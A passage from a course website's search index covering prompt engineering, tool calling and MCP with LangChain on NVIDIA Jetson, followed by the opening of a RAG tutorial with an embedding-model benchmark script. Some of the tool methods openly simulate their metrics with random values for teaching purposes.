round(random.uniform(10, 50), 2),\n                \"latency_p95\": round(random.uniform(20, 100), 2),\n                \"memory_efficiency\": round(random.uniform(0.6, 0.9), 3),\n                \"gpu_memory_usage_mb\": round(random.uniform(1000, 4000), 2)\n            },\n            \"alerts\": [\n                \"High temperature detected at 14:32\",\n                \"Memory usage approaching limit\"\n            ] if random.random() &gt; 0.7 else []\n        }\n\n        return metrics\n\n    def _benchmark_model(self, model_path: str, test_config: Dict[str, Any]) -&gt; Dict[str, Any]:\n        \"\"\"Comprehensive model benchmarking\"\"\"\n        import random\n\n        model_name = model_path.split('/')[-1]\n\n        # Simulate detailed benchmarking\n        results = {\n            \"model_info\": {\n                \"name\": model_name,\n                \"path\": model_path,\n                \"size_mb\": round(random.uniform(50, 500), 2),\n                \"precision\": test_config.get(\"precision\", \"fp16\")\n            },\n            \"performance\": {\n                \"fps_avg\": round(random.uniform(20, 80), 2),\n                \"fps_min\": round(random.uniform(10, 30), 2),\n                \"fps_max\": round(random.uniform(50, 100), 2),\n                \"latency_avg\": round(random.uniform(15, 80), 2),\n                \"latency_p95\": round(random.uniform(30, 120), 2),\n                \"throughput_imgs_sec\": round(random.uniform(15, 75), 2)\n            },\n            \"resource_usage\": {\n                \"gpu_memory_mb\": round(random.uniform(500, 3000), 2),\n                \"cpu_usage_percent\": round(random.uniform(20, 60), 2),\n                \"power_draw_w\": round(random.uniform(8, 22), 2),\n                \"temperature_c\": round(random.uniform(45, 75), 2)\n            },\n            \"accuracy_metrics\": {\n                \"map_50\": round(random.uniform(0.7, 0.95), 3),\n                \"map_75\": round(random.uniform(0.5, 0.8), 3),\n                \"precision\": round(random.uniform(0.8, 0.95), 3),\n                \"recall\": round(random.uniform(0.75, 0.9), 3)\n            },\n            \"optimization_suggestions\": [\n                \"Consider TensorRT FP16 optimization for 2x speedup\",\n                \"Batch processing could improve throughput by 30%\",\n                \"Dynamic shapes optimization available\"\n            ]\n        }\n\n        return results\n\n    def process_complex_request(self, user_request: str) -&gt; str:\n        \"\"\"Process complex requests using multiple tools and MCP\"\"\"\n        # Add to conversation history\n        self.conversation_history.append({\"role\": \"user\", \"content\": user_request})\n\n        # Create comprehensive analysis prompt\n        analysis_prompt = f\"\"\"\nYou are an advanced Jetson AI assistant with access to comprehensive tools and MCP capabilities.\n\nConversation History:\n{json.dumps(self.conversation_history[-3:], indent=2)}\n\nCurrent Request: {user_request}\n\nAvailable Tools:\n{json.dumps(list(self.tool_registry.keys()), indent=2)}\n\nAnalyze the request and create an execution plan. Respond with:\n{{\n    \"analysis\": \"Your understanding of the request\",\n    \"execution_plan\": [\n        {{\n            \"step\": 1,\n            \"action\": \"tool_call|mcp_prompt|direct_response\",\n            \"details\": \"Specific action details\",\n            \"reasoning\": \"Why this step is needed\"\n        }}\n    ],\n    \"expected_outcome\": \"What the user should expect\"\n}}\n\nAnalyze and plan:\n\"\"\"\n\n        try:\n            plan_response = self.llm.invoke(analysis_prompt)\n            plan = json.loads(plan_response)\n\n            # Execute the plan\n            execution_results = []\n            for step in plan.get(\"execution_plan\", []):\n                if step[\"action\"] == \"tool_call\":\n                    # Execute tool call\n                    tool_name = step[\"details\"].get(\"tool_name\")\n                    if tool_name in self.tool_registry:\n                        result = self.tool_registry[tool_name](**step[\"details\"].get(\"parameters\", {}))\n                        execution_results.append({\"step\": step[\"step\"], \"result\": result})\n\n                elif step[\"action\"] == \"mcp_prompt\":\n                    # Use MCP prompt\n                    prompt_name = step[\"details\"].get(\"prompt_name\")\n                    prompt_args = step[\"details\"].get(\"arguments\", {})\n                    prompt_result = self.mcp_server.get_prompt(prompt_name, prompt_args)\n                    if \"error\" not in prompt_result:\n                        prompt_text = prompt_result[\"messages\"][0][\"content\"][\"text\"]\n                        result = self.llm.invoke(prompt_text)\n                        execution_results.append({\"step\": step[\"step\"], \"result\": result})\n\n            # Generate final response\n            final_prompt = f\"\"\"\nUser Request: {user_request}\n\nExecution Results:\n{json.dumps(execution_results, indent=2, default=str)}\n\nBased on the execution results, provide a comprehensive, actionable response to the user. Include:\n1. Direct answer to their question\n2. Specific data and insights from the tools\n3. Actionable recommendations\n4. Next steps they should consider\n\nResponse:\n\"\"\"\n\n            final_response = self.llm.invoke(final_prompt)\n\n            # Add to conversation history\n            self.conversation_history.append({\"role\": \"assistant\", \"content\": final_response})\n\n            return final_response\n\n        except Exception as e:\n            return f\"Error processing complex request: {e}\"\n\n# Initialize advanced assistant\nassistant = JetsonAIAssistant(langchain_openai.llm)\n\n# Test complex scenarios\ncomplex_scenarios = [\n    \"I need to deploy 3 different AI models on my Jetson Orin for a production surveillance system. The models are YOLOv8 for detection, a classification model for verification, and a tracking model. I need 30 FPS minimum with less than 20W power consumption. Can you help me create an optimization and deployment plan?\",\n\n    \"My current object detection pipeline is running at 18 FPS but I need 25 FPS. The model is using 3.2GB GPU memory and the system temperature reaches 78\u00b0C under load. What's the best optimization strategy?\",\n\n    \"I want to compare the performance of YOLOv8, YOLOv10, and RT-DETR on Jetson Orin Nano for real-time person detection in retail environments. Can you help me set up benchmarks and provide recommendations?\"\n]\n\nprint(\"\\n\ud83e\udd16 Advanced AI Assistant Testing:\")\nprint(\"=\" * 60)\n\nfor i, scenario in enumerate(complex_scenarios[:2], 1):\n    print(f\"\\n\ud83d\udccb Complex Scenario {i}:\")\n    print(f\"Request: {scenario[:100]}...\")\n    print(\"-\" * 50)\n    response = assistant.process_complex_request(scenario)\n    print(f\"Response: {response[:400]}...\")\n</code></pre>"},{"location":"curriculum/08_prompt_engineering_langchain_jetson/#exercise-3-production-ready-mcp-application","title":"\ud83d\udccb Exercise 3: Production-Ready MCP Application","text":"<p>Create a production-ready application using MCP for Jetson AI development:</p> <pre><code>class ProductionMCPApp:\n    \"\"\"Production-ready MCP application for Jetson AI development\"\"\"\n\n    def __init__(self):\n        self.mcp_server = self._initialize_mcp_server()\n        self.llm_clients = self._initialize_llm_clients()\n        self.session_manager = SessionManager()\n        self.performance_tracker = PerformanceTracker()\n\n    def _initialize_mcp_server(self) -&gt; MCPServer:\n        \"\"\"Initialize comprehensive MCP server\"\"\"\n        server = MCPServer()\n\n        # Register production tools\n        server.register_tool(\"jetson_diagnostics\", \"Run comprehensive Jetson diagnostics\", self._run_diagnostics)\n        server.register_tool(\"model_optimizer\", \"Optimize models for production deployment\", self._optimize_model)\n        server.register_tool(\"deployment_manager\", \"Manage model deployments\", self._manage_deployment)\n        server.register_tool(\"performance_analyzer\", \"Analyze system performance\", self._analyze_performance)\n\n        # Register production prompt templates\n        server.register_prompt(\n            \"production_readiness_check\",\n            \"Comprehensive production readiness assessment\",\n            self._get_production_readiness_template()\n        )\n\n        server.register_prompt(\n            \"incident_response\",\n            \"Generate incident response plan\",\n            self._get_incident_response_template()\n        )\n\n        return server\n\n    def _get_production_readiness_template(self) -&gt; str:\n        return \"\"\"\nCONDUCT PRODUCTION READINESS ASSESSMENT\n=====================================\n\nApplication: {app_name}\nEnvironment: {environment}\nModels: {models}\nExpected Load: {expected_load}\nSLA Requirements: {sla_requirements}\n\nAssessment Areas:\n\n1. PERFORMANCE VALIDATION\n   - Benchmark results under expected load\n   - Latency and throughput analysis\n   - Resource utilization assessment\n   - Stress testing results\n\n2. RELIABILITY &amp; STABILITY\n   - Error handling mechanisms\n   - Failover procedures\n   - Recovery strategies\n   - Memory leak detection\n\n3. MONITORING &amp; OBSERVABILITY\n   - Metrics collection setup\n   - Alerting configuration\n   - Logging implementation\n   - Dashboard availability\n\n4. SECURITY CONSIDERATIONS\n   - Model security validation\n   - Data privacy compliance\n   - Access control implementation\n   - Vulnerability assessment\n\n5. OPERATIONAL READINESS\n   - Deployment automation\n   - Rollback procedures\n   - Documentation completeness\n   - Team training status\n\nProvide a comprehensive assessment with:\n- Go/No-Go recommendation\n- Critical issues to address\n- Risk mitigation strategies\n- Timeline for production deployment\n\nASSESSMENT REPORT:\n\"\"\"\n\n    def _get_incident_response_template(self) -&gt; str:\n        return \"\"\"\nINCIDENT RESPONSE PLAN\n====================\n\nIncident Type: {incident_type}\nSeverity: {severity}\nAffected Systems: {affected_systems}\nImpact: {impact}\n\nIMMEDIATE ACTIONS (0-15 minutes):\n1. Assess incident scope and impact\n2. Implement immediate containment\n3. Notify stakeholders\n4. Begin incident logging\n\nSHORT-TERM ACTIONS (15-60 minutes):\n1. Detailed investigation\n2. Implement workarounds\n3. Escalate if necessary\n4. Communicate status updates\n\nLONG-TERM ACTIONS (1+ hours):\n1. Root cause analysis\n2. Permanent fix implementation\n3. System validation\n4. Post-incident review\n\nSPECIFIC PROCEDURES:\n- Performance degradation: {performance_procedures}\n- Model accuracy issues: {accuracy_procedures}\n- System failures: {failure_procedures}\n- Security incidents: {security_procedures}\n\nCONTACT INFORMATION:\n- On-call engineer: {oncall_contact}\n- Escalation manager: {escalation_contact}\n- Vendor support: {vendor_contact}\n\nGenerate detailed incident response plan:\n\"\"\"\n\n    def run_production_workflow(self, workflow_type: str, parameters: Dict[str, Any]) -&gt; Dict[str, Any]:\n        \"\"\"Run production workflows using MCP\"\"\"\n\n        workflow_results = {\n            \"workflow_type\": workflow_type,\n            \"start_time\": time.time(),\n            \"parameters\": parameters,\n            \"steps\": [],\n            \"status\": \"running\"\n        }\n\n        try:\n            if workflow_type == \"model_deployment\":\n                workflow_results[\"steps\"] = self._execute_deployment_workflow(parameters)\n            elif workflow_type == \"performance_optimization\":\n                workflow_results[\"steps\"] = self._execute_optimization_workflow(parameters)\n            elif workflow_type == \"production_validation\":\n                workflow_results[\"steps\"] = self._execute_validation_workflow(parameters)\n\n            workflow_results[\"status\"] = \"completed\"\n            workflow_results[\"end_time\"] = time.time()\n            workflow_results[\"duration\"] = workflow_results[\"end_time\"] - workflow_results[\"start_time\"]\n\n        except Exception as e:\n            workflow_results[\"status\"] = \"failed\"\n            workflow_results[\"error\"] = str(e)\n            workflow_results[\"end_time\"] = time.time()\n\n        return workflow_results\n\n# Initialize production app\nproduction_app = ProductionMCPApp()\n\nprint(\"\\n\ud83c\udfed Production MCP Application Ready\")\nprint(\"Available workflows: model_deployment, performance_optimization, production_validation\")\n</code></pre> <p>Note: These lab exercises are included in the unified <code>jetson_prompt_toolkit.py</code> script. You can run them with: <pre><code>python jetson_prompt_toolkit.py --mode lab\n</code></pre></p>"},{"location":"curriculum/08_prompt_engineering_langchain_jetson/#lab-results-and-analysis","title":"\ud83d\udcca Lab Results and Analysis","text":"<p>After completing all exercises, analyze your results:</p> <ol> <li>Prompt Engineering Effectiveness: Which techniques worked best for different types of tasks?</li> <li>Tool Integration Performance: How did tool calling improve response quality and accuracy?</li> <li>MCP Protocol Benefits: What advantages did MCP provide over direct tool calling?</li> <li>Jetson-Specific Optimizations: Which prompt engineering approaches were most effective for edge AI scenarios?</li> </ol>"},{"location":"curriculum/08_prompt_engineering_langchain_jetson/#next-steps","title":"\ud83c\udfaf Next Steps","text":"<ol> <li>Experiment with Custom Models: Try the techniques with different local models</li> <li>Build Domain-Specific Tools: Create tools specific to your AI application domain</li> <li>Implement Production Monitoring: Add comprehensive logging and monitoring to your MCP applications</li> <li>Optimize for Edge Deployment: Focus on minimizing latency and resource usage for production edge AI systems</li> </ol>"},{"location":"curriculum/08_prompt_engineering_langchain_jetson/#conclusion","title":"\ud83c\udf89 Conclusion","text":"<p>This tutorial covered comprehensive prompt engineering techniques for Jetson AI development, from basic prompting strategies to advanced tool calling and MCP protocol implementation. You've learned how to:</p> <ul> <li>Master Core Techniques: Chain-of-thought, few-shot learning, role-based prompting, and in-context learning</li> <li>Integrate LangChain: Leverage LangChain for model-agnostic prompt engineering and structured output</li> <li>Implement Tool Calling: Enable LLMs to interact with external tools and functions</li> <li>Use MCP Protocol: Build scalable applications using the Model Context Protocol</li> <li>Optimize for Jetson: Apply prompt engineering specifically for edge AI scenarios</li> </ul> <p>These techniques enable you to build sophisticated AI applications that can reason, plan, and execute complex tasks on Jetson platforms, making your edge AI systems more intelligent and capable.</p>"},{"location":"curriculum/08_prompt_engineering_langchain_jetson/#goal","title":"\ud83c\udfaf Goal","text":"<p>Test and compare prompt engineering on three backends:</p> <ol> <li>llama-cpp-python</li> <li>Ollama</li> <li>OpenAI API</li> </ol>"},{"location":"curriculum/08_prompt_engineering_langchain_jetson/#prompt-types-to-try","title":"\ud83d\udd01 Prompt Types to Try","text":"<ul> <li>Instructional prompt</li> <li>Few-shot learning</li> <li>Chain-of-thought reasoning</li> <li>Rewriting and follow-ups</li> </ul>"},{"location":"curriculum/08_prompt_engineering_langchain_jetson/#deliverables","title":"\ud83d\udccb Deliverables","text":"<ul> <li>Code + PromptTemplate examples</li> <li>Comparison table of responses from three backends</li> <li>Bonus: Add memory support for follow-up context</li> </ul>"},{"location":"curriculum/08_prompt_engineering_langchain_jetson/#summary","title":"\ud83e\udde0 Summary","text":"<ul> <li>Start with local inference and basic prompting</li> <li>Move to API-based or structured LangChain interfaces</li> <li>Use LangChain to modularize prompt types and switch LLM backends (OpenAI, Ollama, or llama-cpp)</li> <li>Jetson Orin Nano supports local inference with quantized models using llama.cpp or Ollama</li> </ul>"},{"location":"curriculum/08_prompt_engineering_langchain_jetson/#unified-python-script","title":"\ud83d\ude80 Unified Python Script","text":"<p>All the Python code examples from this tutorial have been consolidated into a single, unified script called <code>jetson_prompt_toolkit.py</code>. This script provides a command-line interface to experiment with different prompt engineering techniques, backends, and advanced features.</p>"},{"location":"curriculum/08_prompt_engineering_langchain_jetson/#installation","title":"\ud83d\udce5 Installation","text":"<pre><code># Clone the repository if you haven't already\ngit clone https://github.com/yourusername/edgeAI.git\ncd edgeAI\n\n# Install dependencies\npip install openai langchain langchain-openai langchain-community pydantic\n\n# Optional: Install Ollama for local inference\n# Follow instructions at https://ollama.ai/\n\n# Optional: Install llama-cpp-python for local inference\npip install llama-cpp-python\n</code></pre>"},{"location":"curriculum/08_prompt_engineering_langchain_jetson/#usage-examples","title":"\ud83d\udd27 Usage Examples","text":""},{"location":"curriculum/08_prompt_engineering_langchain_jetson/#basic-prompt-engineering-techniques","title":"Basic Prompt Engineering Techniques","text":"<pre><code># Test Chain-of-Thought reasoning with OpenAI\npython jetson_prompt_toolkit.py --mode basic --technique cot --backends openai\n\n# Compare all techniques across multiple backends\npython jetson_prompt_toolkit.py --mode basic --technique all --backends openai,ollama\n</code></pre>"},{"location":"curriculum/08_prompt_engineering_langchain_jetson/#compare-different-backends","title":"Compare Different Backends","text":"<pre><code># Compare responses from different backends\npython jetson_prompt_toolkit.py --mode compare --backends openai,ollama,llamacpp --llamacpp-model /path/to/model.gguf\n</code></pre>"},{"location":"curriculum/08_prompt_engineering_langchain_jetson/#structured-output-generation","title":"Structured Output Generation","text":"<pre><code># Generate a YOLOv8 optimization plan\npython jetson_prompt_toolkit.py --mode structured --output optimization_plan --backends openai\n\n# Compare Jetson devices\npython jetson_prompt_toolkit.py --mode structured --output device_comparison --backends openai\n</code></pre>"},{"location":"curriculum/08_prompt_engineering_langchain_jetson/#tool-calling-demonstrations","title":"Tool Calling Demonstrations","text":"<pre><code># Process a request using tool calling\npython jetson_prompt_toolkit.py --mode tools --request \"What's the current system status of my Jetson device?\"\n</code></pre>"},{"location":"curriculum/08_prompt_engineering_langchain_jetson/#function-calling-demonstrations","title":"Function Calling Demonstrations","text":"<pre><code># Process a request using function calling\npython jetson_prompt_toolkit.py --mode functions --request \"I need to optimize my YOLOv8 model for Jetson Nano\"\n</code></pre>"},{"location":"curriculum/08_prompt_engineering_langchain_jetson/#mcp-protocol-demonstrations","title":"MCP Protocol Demonstrations","text":"<pre><code># Process a request using MCP\npython jetson_prompt_toolkit.py --mode mcp --request \"Create a deployment checklist for my YOLOv8 model on Jetson Xavier NX\"\n</code></pre>"},{"location":"curriculum/08_prompt_engineering_langchain_jetson/#advanced-assistant-demonstrations","title":"Advanced Assistant Demonstrations","text":"<pre><code># Process a complex request with the Jetson AI Assistant\npython jetson_prompt_toolkit.py --mode assistant --request \"I need to deploy multiple AI models on my Jetson AGX Orin for a smart retail application\"\n</code></pre>"},{"location":"curriculum/08_prompt_engineering_langchain_jetson/#production-mcp-application","title":"Production MCP Application","text":"<pre><code># Run a production workflow\npython jetson_prompt_toolkit.py --mode production\n</code></pre>"},{"location":"curriculum/08_prompt_engineering_langchain_jetson/#switching-models","title":"\ud83d\udd04 Switching Models","text":"<p>You can specify which models to use with each backend:</p> <pre><code># Use a specific OpenAI model\npython jetson_prompt_toolkit.py --mode basic --technique cot --backends openai --openai-model gpt-4o\n\n# Use a specific Ollama model\npython jetson_prompt_toolkit.py --mode basic --technique cot --backends ollama --ollama-model llama3.1:8b\n\n# Use a specific llama-cpp-python model\npython jetson_prompt_toolkit.py --mode basic --technique cot --backends llamacpp --llamacpp-model /path/to/model.gguf\n</code></pre>"},{"location":"curriculum/09_rag_app_langchain_jetson/","title":"\ud83d\udcda RAG Applications with LangChain on Jetson","text":"<p>Author: Dr. Kaikai Liu, Ph.D. Position: Associate Professor, Computer Engineering Institution: San Jose State University Contact: kaikai.liu@sjsu.edu</p>"},{"location":"curriculum/09_rag_app_langchain_jetson/#what-is-rag","title":"\ud83e\udd14 What is RAG?","text":"<p>RAG (Retrieval-Augmented Generation) is a powerful paradigm that combines the generative capabilities of Large Language Models (LLMs) with external knowledge retrieval. Unlike traditional LLMs that rely solely on their pre-trained parameters, RAG systems dynamically retrieve relevant information from external knowledge bases to augment the generation process.</p>"},{"location":"curriculum/09_rag_app_langchain_jetson/#the-technology-behind-rag","title":"\ud83d\udd2c The Technology Behind RAG","text":""},{"location":"curriculum/09_rag_app_langchain_jetson/#core-components","title":"Core Components:","text":"<ol> <li>Knowledge Base: External documents, databases, or structured data</li> <li>Embedding Model: Converts text into high-dimensional vector representations</li> <li>Vector Database: Stores and indexes embeddings for efficient similarity search</li> <li>Retriever: Finds relevant documents based on query similarity</li> <li>Generator: LLM that produces responses using retrieved context</li> </ol>"},{"location":"curriculum/09_rag_app_langchain_jetson/#rag-workflow","title":"RAG Workflow:","text":"<pre><code>User Query \u2192 Embedding \u2192 Vector Search \u2192 Context Retrieval \u2192 LLM Generation \u2192 Response\n</code></pre>"},{"location":"curriculum/09_rag_app_langchain_jetson/#understanding-embeddings","title":"\ud83e\udde0 Understanding Embeddings","text":"<p>Embeddings are dense vector representations that capture semantic meaning of text. They enable machines to understand that \"car\" and \"automobile\" are semantically similar, even though they share no common characters.</p>"},{"location":"curriculum/09_rag_app_langchain_jetson/#key-properties","title":"Key Properties:","text":"<ul> <li>Dimensionality: Typically 384-1536 dimensions</li> <li>Semantic Similarity: Similar concepts have similar vectors</li> <li>Distance Metrics: Cosine similarity, Euclidean distance, dot product</li> <li>Context Awareness: Modern embeddings capture contextual meaning</li> </ul>"},{"location":"curriculum/09_rag_app_langchain_jetson/#types-of-embedding-models","title":"Types of Embedding Models:","text":"<ol> <li>Sentence Transformers: Optimized for semantic similarity</li> <li>OpenAI Embeddings: High-quality but require API calls</li> <li>Local Models: BERT, RoBERTa, E5, BGE variants</li> <li>Multilingual Models: Support multiple languages</li> <li>Domain-Specific: Fine-tuned for specific domains (legal, medical, code)</li> </ol>"},{"location":"curriculum/09_rag_app_langchain_jetson/#why-rag-on-jetson","title":"\ud83d\udca1 Why RAG on Jetson?","text":""},{"location":"curriculum/09_rag_app_langchain_jetson/#edge-ai-advantages","title":"Edge AI Advantages:","text":"<ul> <li>Privacy: Keep sensitive data local, no cloud dependency</li> <li>Latency: Sub-second response times for real-time applications</li> <li>Reliability: Works offline, immune to network issues</li> <li>Cost: No API costs for embeddings and inference</li> <li>Customization: Fine-tune models for specific use cases</li> </ul>"},{"location":"curriculum/09_rag_app_langchain_jetson/#jetson-specific-benefits","title":"Jetson-Specific Benefits:","text":"<ul> <li>GPU Acceleration: CUDA support for embedding computation</li> <li>Memory Efficiency: Optimized models for edge deployment</li> <li>Power Efficiency: Low-power consumption for continuous operation</li> <li>Integration: Easy integration with sensors and IoT devices</li> </ul>"},{"location":"curriculum/09_rag_app_langchain_jetson/#advanced-rag-architecture","title":"\ud83d\udd27 Advanced RAG Architecture","text":""},{"location":"curriculum/09_rag_app_langchain_jetson/#rag-pipeline-components","title":"\ud83d\udcca RAG Pipeline Components","text":"<pre><code>graph TD\n    A[User Query] --&gt; B[Query Embedding]\n    B --&gt; C[Vector Search]\n    C --&gt; D[Document Retrieval]\n    D --&gt; E[Context Ranking]\n    E --&gt; F[Prompt Construction]\n    F --&gt; G[LLM Generation]\n    G --&gt; H[Response]\n\n    I[Document Corpus] --&gt; J[Text Chunking]\n    J --&gt; K[Embedding Generation]\n    K --&gt; L[Vector Storage]\n    L --&gt; C\n</code></pre>"},{"location":"curriculum/09_rag_app_langchain_jetson/#detailed-architecture","title":"\ud83c\udfd7\ufe0f Detailed Architecture","text":"<ol> <li>Indexing Phase (Offline):</li> <li>Document loading and preprocessing</li> <li>Text chunking with overlap strategies</li> <li>Embedding generation using optimized models</li> <li> <p>Vector storage with efficient indexing</p> </li> <li> <p>Retrieval Phase (Online):</p> </li> <li>Query embedding generation</li> <li>Similarity search in vector space</li> <li>Context ranking and filtering</li> <li> <p>Prompt template construction</p> </li> <li> <p>Generation Phase:</p> </li> <li>Context-aware LLM inference</li> <li>Response generation and post-processing</li> <li>Optional fact-checking and validation</li> </ol>"},{"location":"curriculum/09_rag_app_langchain_jetson/#rag-optimization-strategies","title":"\ud83c\udfaf RAG Optimization Strategies","text":""},{"location":"curriculum/09_rag_app_langchain_jetson/#chunking-strategies","title":"Chunking Strategies:","text":"<ul> <li>Fixed-size: Simple but may break semantic units</li> <li>Semantic: Preserve paragraph/sentence boundaries</li> <li>Recursive: Hierarchical chunking with multiple levels</li> <li>Sliding window: Overlapping chunks for context preservation</li> </ul>"},{"location":"curriculum/09_rag_app_langchain_jetson/#retrieval-strategies","title":"Retrieval Strategies:","text":"<ul> <li>Dense Retrieval: Vector similarity search</li> <li>Sparse Retrieval: BM25, TF-IDF keyword matching</li> <li>Hybrid Retrieval: Combine dense and sparse methods</li> <li>Multi-vector: Multiple embeddings per document</li> </ul>"},{"location":"curriculum/09_rag_app_langchain_jetson/#context-enhancement","title":"Context Enhancement:","text":"<ul> <li>Re-ranking: Secondary ranking of retrieved documents</li> <li>Query expansion: Enhance queries with related terms</li> <li>Context compression: Summarize long retrieved contexts</li> <li>Multi-hop: Iterative retrieval for complex queries</li> </ul>"},{"location":"curriculum/09_rag_app_langchain_jetson/#key-components-in-langchain","title":"\ud83e\uddf1 Key Components in LangChain","text":"<ul> <li><code>DocumentLoader</code>: Load PDFs, markdowns, text, web pages</li> <li><code>TextSplitter</code>: Break documents into chunks with various strategies</li> <li><code>Embeddings</code>: Convert text to vectors using local or cloud models</li> <li><code>VectorStore</code>: FAISS, Chroma, Qdrant, Weaviate, Pinecone</li> <li><code>Retriever</code>: Pull relevant chunks with ranking and filtering</li> <li><code>LLM</code>: Generate final answer using GGUF models via llama-cpp or Ollama</li> </ul>"},{"location":"curriculum/09_rag_app_langchain_jetson/#embedding-models-evaluation-on-jetson","title":"\ud83d\ude80 Embedding Models Evaluation on Jetson","text":""},{"location":"curriculum/09_rag_app_langchain_jetson/#embedding-model-comparison","title":"\ud83d\udccb Embedding Model Comparison","text":"<p>We'll evaluate various embedding models on Jetson platforms focusing on: - Performance: Inference speed and throughput - Quality: Semantic similarity accuracy - Memory: RAM and VRAM usage - Power: Energy consumption</p>"},{"location":"curriculum/09_rag_app_langchain_jetson/#embedding-models-benchmark","title":"\ud83d\udd2c Embedding Models Benchmark","text":"<pre><code>import time\nimport psutil\nimport torch\nfrom sentence_transformers import SentenceTransformer\nfrom transformers import AutoTokenizer, AutoModel\nimport numpy as np\nfrom typing import List, Dict, Any\n\nclass EmbeddingBenchmark:\n    \"\"\"Comprehensive embedding model benchmark for Jetson\"\"\"\n\n    def __init__(self):\n        self.models = {\n            # Lightweight models (&lt; 100MB)\n            \"all-MiniLM-L6-v2\": \"sentence-transformers/all-MiniLM-L6-v2\",\n            \"all-MiniLM-L12-v2\": \"sentence-transformers/all-MiniLM-L12-v2\",\n            \"paraphrase-MiniLM-L6-v2\": \"sentence-transformers/paraphrase-MiniLM-L6-v2\",\n\n            # Medium models (100-500MB)\n            \"all-mpnet-base-v2\": \"sentence-transformers/all-mpnet-base-v2\",\n            \"all-roberta-large-v1\": \"sentence-transformers/all-roberta-large-v1\",\n            \"e5-base-v2\": \"intfloat/e5-base-v2\",\n\n            # Large models (&gt; 500MB)\n            \"e5-large-v2\": \"intfloat/e5-large-v2\",\n            \"bge-large-en-v1.5\": \"BAAI/bge-large-en-v1.5\",\n            \"gte-large\": \"thenlper/gte-large\",\n\n            # Multilingual models\n            \"paraphrase-multilingual-MiniLM-L12-v2\": \"sentence-transformers/paraphrase-multilingual-MiniLM-L12-v2\",\n            \"multilingual-e5-base\": \"intfloat/multilingual-e5-base\"\n        }\n\n        self.test_texts = [\n            \"NVIDIA Jetson is a series of embedded computing boards from NVIDIA.\",\n            \"The Jetson platform provides AI computing at the edge with GPU acceleration.\",\n            \"Deep learning models can be optimized for inference on Jetson devices.\",\n            \"TensorRT enables high-performance inference on NVIDIA GPUs.\",\n            \"Edge AI applications benefit from local processing capabilities.\"\n        ] * 20  # 100 texts for throughput testing\n\n    def benchmark_model(self, model_name: str, model_path: str) -&gt; Dict[str, Any]:\n        \"\"\"Benchmark a single embedding model\"\"\"\n        print(f\"\\n\ud83d\udd0d Benchmarking {model_name}...\")\n\n        try:\n            # Load model\n            start_time = time.time()\n            if \"sentence-transformers\" in model_path:\n                model = SentenceTransformer(model_path)\n            else:\n                # Use transformers directly for more control\n                tokenizer = AutoTokenizer.from_pretrained(model_path)\n                model = AutoModel.from_pretrained(model_path)\n\n            load_time = time.time() - start_time\n\n            # Memory usage before inference\n            process = psutil.Process()\n            memory_before = process.memory_info().rss / 1024 / 1024  # MB\n\n            # GPU memory (if available)\n            gpu_memory_before = 0\n            if torch.cuda.is_available():\n                torch.cuda.empty_cache()\n                gpu_memory_before = torch.cuda.memory_allocated() / 1024 / 1024  # MB\n\n            # Warm-up\n            if hasattr(model, 'encode'):\n                _ = model.encode([\"warm up\"])\n            else:\n                # For transformers models\n                inputs = tokenizer([\"warm up\"], return_tensors=\"pt\", padding=True, truncation=True)\n                with torch.no_grad():\n                    _ = model(**inputs)\n\n            # Benchmark inference speed\n            start_time = time.time()\n\n            if hasattr(model, 'encode'):\n                embeddings = model.encode(self.test_texts, batch_size=32, show_progress_bar=False)\n            else:\n                # For transformers models - batch processing\n                embeddings = []\n                batch_size = 32\n                for i in range(0, len(self.test_texts), batch_size):\n                    batch = self.test_texts[i:i+batch_size]\n                    inputs = tokenizer(batch, return_tensors=\"pt\", padding=True, truncation=True, max_length=512)\n                    with torch.no_grad():\n                        outputs = model(**inputs)\n                        # Mean pooling\n                        batch_embeddings = outputs.last_hidden_state.mean(dim=1)\n                        embeddings.extend(batch_embeddings.cpu().numpy())\n                embeddings = np.array(embeddings)\n\n            inference_time = time.time() - start_time\n\n            # Memory usage after inference\n            memory_after = process.memory_info().rss / 1024 / 1024  # MB\n            gpu_memory_after = 0\n            if torch.cuda.is_available():\n                gpu_memory_after = torch.cuda.memory_allocated() / 1024 / 1024  # MB\n\n            # Calculate metrics\n            throughput = len(self.test_texts) / inference_time  # texts per second\n            avg_latency = inference_time / len(self.test_texts) * 1000  # ms per text\n\n            results = {\n                \"model_name\": model_name,\n                \"load_time_s\": round(load_time, 3),\n                \"inference_time_s\": round(inference_time, 3),\n                \"throughput_texts_per_sec\": round(throughput, 2),\n                \"avg_latency_ms\": round(avg_latency, 3),\n                \"memory_usage_mb\": round(memory_after - memory_before, 2),\n                \"gpu_memory_mb\": round(gpu_memory_after - gpu_memory_before, 2),\n                \"embedding_dim\": embeddings.shape[1],\n                \"total_memory_mb\": round(memory_after, 2),\n                \"status\": \"success\"\n            }\n\n            # Clean up\n            del model\n            if torch.cuda.is_available():\n                torch.cuda.empty_cache()\n\n            return results\n\n        except Exception as e:\n            return {\n                \"model_name\": model_name,\n                \"status\": \"failed\",\n                \"error\": str(e)\n            }\n\n    def run_full_benchmark(self) -&gt; List[Dict[str, Any]]:\n        \"\"\"Run benchmark on all models\"\"\"\n        results = []\n\n        print(\"\ud83d\ude80 Starting Embedding Models Benchmark on Jetson\")\n        print(\"=\" * 60)\n\n        for model_name, model_path in self.models.items():\n            result = self.benchmark_model(model_name, model_path)\n            results.append(result)\n\n            if result[\"status\"] == \"success\":\n                print(f\"\u2705 {model_name}: {result['throughput_texts_per_sec']:.1f} texts/sec, \"\n                      f\"{result['avg_latency_ms']:.1f}ms latency, \"\n                      f\"{result['memory_usage_mb']:.1f}MB memory\")\n            else:\n                print(f\"\u274c {model_name}: {result['error']}\")\n\n        return results\n\n    def generate_report(self, results: List[Dict[str, Any]]) -&gt; str:\n        \"\"\"Generate comprehensive benchmark report\"\"\"\n        successful_results = [r for r in results if r[\"status\"] == \"success\"]\n\n        if not successful_results:\n            return \"No successful benchmarks to report.\"\n\n        # Sort by throughput\n        successful_results.sort(key=lambda x: x[\"throughput_texts_per_sec\"], reverse=True)\n\n        report = \"\\n\" + \"=\" * 80\n        report += \"\\n\ud83c\udfc6 JETSON EMBEDDING MODELS BENCHMARK REPORT\\n\"\n        report += \"=\" * 80 + \"\\n\"\n\n        # Performance ranking\n        report += \"\\n\ud83d\udcca PERFORMANCE RANKING (by throughput):\\n\"\n        report += \"-\" * 50 + \"\\n\"\n        for i, result in enumerate(successful_results[:5], 1):\n            report += f\"{i}. {result['model_name']:&lt;30} {result['throughput_texts_per_sec']:&gt;8.1f} texts/sec\\n\"\n\n        # Memory efficiency ranking\n        memory_sorted = sorted(successful_results, key=lambda x: x[\"memory_usage_mb\"])\n        report += 